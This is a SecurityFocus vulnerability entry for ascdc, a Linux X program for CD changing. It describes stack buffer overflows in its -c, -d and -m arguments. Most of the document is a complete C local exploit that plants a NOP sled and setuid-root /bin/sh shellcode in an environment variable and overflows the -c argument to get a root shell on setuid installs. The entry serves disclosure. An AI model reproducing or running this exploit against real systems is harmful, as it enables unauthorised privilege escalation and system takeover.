source: http://www.securityfocus.com/bid/2462/info
 
ascdc is a program written for X by Rob Malda. It is designed to provide a graphical interface to cd changing on linux systems.
 
A vulnerability in the program could allow elevated privileges on a system with the package installed setuid. Due to insufficent bounds checking, it is possible to execute arbitrary code with the ascdc program. Overflows in the -c, -d, and -m arguments make it possible for a user to overwrite variables on the stack, including the return address, and execute shellcode.
 
The program is not installed setuid. However, in a setuid installation, this problem makes it possible for a user to execute arbitrary code, and potentially gain elevated privileges. 

/* /usr/X11R6/bin/ascdc local exploit.
 * (version: ascdc-0.3-2-i386)
 *
 * Vulnerability found by Christer ?berg, Wkit Security AB 
 *
 * <cut and pasted from the advisory posted on bugtraq> 
 *
 * There are multiple buffer overflows in ascdc that can be exploited to 
 * gain root if it is installed setuid root. It is NOT installed setuid root 
 * by default but as the README says:
 * "If you intend to use the automounting feature, you must either run 
 * ascdc as root or setuid it."
 *
 * Greetz fly out to: Tasc, C-murdah, Calimonk, Pyra, Tozz, Wildcoyote,
 *                    Lucipher, Script0r, Zephyr, ThePike, Kn00p, Cerial
 *		      Goolie and X-wartech.
 *
 * - The Itch / BsE
 * - http://bse.die.ms
 * - irc.axenet.org 
 */
 
#include <stdio.h>
#include <stdlib.h>
 
#define DEFAULT_EGG_SIZE 2048
#define NOP 0x90

/* adjust if needed, this should be suffient */
#define DEFAULT_BUFFER_SIZE 600
 
unsigned long get_sp(void)
{
        __asm__("movl %esp, %eax");
}

char shellcode[] =
        "\x31\xc0\x31\xdb\xb0\x17\xcd\x80"
        "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b"
        "\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd"
        "\x80\xe8\xdc\xff\xff\xff/bin/sh";  

int main(int argc, char *argv[])
{
        char *buff;
        char *egg;
        char *ptr;
        long *addr_ptr;
        long addr;
        int bsize = DEFAULT_BUFFER_SIZE;
        int eggsize = DEFAULT_EGG_SIZE;
        int i;
 
	if(argc > 1) { bsize = atoi(argv[1]); }

	if(!(buff = malloc(bsize)))
	{
		printf("unable to allocate memory for %d bytes\n", bsize);
		exit(1);
	}

	if(!(egg = malloc(eggsize)))
	{
	 	printf("unable to allocate memory for %d bytes\n", eggsize);
 		exit(1);
	}

        addr = get_sp();
 
	printf("/usr/X11R6/bin/ascdc local exploit.\n");
	printf("Coded by The Itch / BsE\n\n");
        printf("Using return address: 0x%x\n", addr);
        printf("Using buffersize    : %d\n", bsize);
 
        ptr = buff;
        addr_ptr = (long *) ptr;  
        for(i = 0; i < bsize; i+=4) { *(addr_ptr++) = addr; }
 
        ptr = egg;
        for(i = 0; i < eggsize - strlen(shellcode) -1; i++) 
	{ 
		*(ptr++) = NOP; 
	} 

	for(i = 0; i < strlen(shellcode); i++) 
	{ 
		*(ptr++) = shellcode[i];
	}

        buff[bsize - 1] = '\0';
        egg[eggsize - 1] = '\0';
        memcpy(egg, "EGG=", 4);
        putenv(egg);
        memcpy(buff, "RET=", 4);
        putenv(buff);
 
        system("/usr/X11R6/bin/ascdc -c $RET");
 
        return 0;
}      

/* remember, there's no cure for BsE */
